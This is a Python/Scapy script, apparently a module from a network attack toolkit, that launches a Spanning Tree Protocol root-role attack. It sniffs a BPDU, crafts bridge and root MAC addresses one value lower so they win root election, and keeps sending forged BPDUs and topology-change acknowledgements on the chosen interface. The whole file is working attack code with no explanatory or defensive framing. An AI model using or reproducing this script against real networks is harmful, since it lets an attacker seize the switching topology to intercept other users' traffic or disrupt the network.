import logging
logging.getLogger("scapy.runtime").setLevel(logging.WARNING)

from scapy.layers.l2 import LLC, STP, Dot3
from scapy.all import sendp,sniff,get_if_hwaddr,srp1,send



def run(interface):
    """
    This function launch STP ROOT ROLE  ATTACK
    :param interface: interface to be launched the attack
    :type interface: str
    """
    # sniff to found a stp packet
    pkt = sniff(stop_filter=lambda x: x.haslayer(STP), iface=interface)

    # Look for a STP packet to use a lower priority
    pk_list={x:y for x,y in pkt.sessions().iteritems() if "Other" in x}
    item=pk_list.popitem()
    pkts = item[1]


    for x in pkts:
        if STP in x:
            STP_packet = x
            break

    #myMAC = get_if_hwaddr(interface)

    #root_id = STP_packet.rootid - 1
    #bridge_id = STP_packet.bridgeid - 1

    rootMAC = STP_packet.rootmac
    bridgeMAC =STP_packet.bridgemac
    aux=False
    newMAC=''

    rootMAC=rootMAC[::-1]

    for x in range(len(rootMAC)):
        if (rootMAC[x] in '123456789abcdef') and not aux:
            n=int(rootMAC[x], 16)
            n-=1
            n=format(n, 'x')
            newMAC+=n
            aux=True
        else:
            newMAC+=rootMAC[x]
    rootMAC=newMAC[::-1]

    newMAC=''
    aux=False
    bridgeMAC=bridgeMAC[::-1]
    for x in range(len(bridgeMAC)):
        if (bridgeMAC[x] in '123456789abcdef') and not aux:
            n=int(bridgeMAC[x], 16)
            n-=1
            n=format(n, 'x')
            newMAC+=n
            aux=True
        else:
            newMAC+=bridgeMAC[x]
    bridgeMAC=newMAC[::-1]
    #brigdemac
    root_id = STP_packet.rootid
    bridge_id = STP_packet.bridgeid
    p_ether = Dot3(dst="01:80:c2:00:00:00", src=bridgeMAC)
    p_llc = LLC()

    p_stp = STP(bpdutype=0x00, bpduflags=0x01, portid=0x8002, rootmac=rootMAC, bridgemac=bridgeMAC,
                rootid=root_id, bridgeid=bridge_id)

    pkt = p_ether/p_llc/p_stp   # STP packet structure
    try:
        while 1:
            pkt_sniff=srp1(pkt, iface=interface, verbose=0, timeout=2)
            if pkt_sniff is not None:
                if STP in pkt_sniff:

                    if pkt_sniff[Dot3].src!=rootMAC:

                        p_stp_ack=STP(bpdutype=0x00, bpduflags=0x81, portid=0x8002, rootmac=rootMAC, bridgemac=bridgeMAC,
                        rootid=root_id, bridgeid=bridge_id)
                        pkt_ack= p_ether/p_llc/p_stp_ack
                        sendp(pkt_ack, iface=interface, verbose=0)


    except KeyboardInterrupt:
        pass



def run_attack(config):
    """ This function is used for launch the STP ROOT ROLE attack
    :param config: GlobalParameters option instance
    :type config: `GlobalParameters`

    """
    run(config.interface[0])